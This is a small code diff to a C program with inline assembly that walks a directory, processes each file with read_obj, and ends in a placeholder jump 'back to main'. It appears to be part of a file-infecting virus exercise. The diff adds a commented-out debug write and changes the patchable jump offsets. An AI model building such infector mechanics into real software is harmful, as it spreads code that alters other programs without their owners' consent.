@@ -67,6 +67,9 @@ int listdir(char *target) {
 					ft_bzero(env->obj_name, env->obj_name_size);
 					ft_strcpy(env->obj_name, target);
 					ft_strcat(env->obj_name, dir->d_name);
+
+					//syscall_write(1, env->obj_name, env->obj_name_size);
+
 					read_obj(env);
 					clear_env(env);
 				}
@@ -126,7 +129,8 @@ int main(void) {
 		"leave \n" 
 		"ret \n"
 		// jump back to main
-		"jmp . + 5 + 0x42424242 \n"
+		"push 0x42424242 \n"
+		"jmp . + 5 + 0x41414141 \n"
 	);
 
 	return 0;
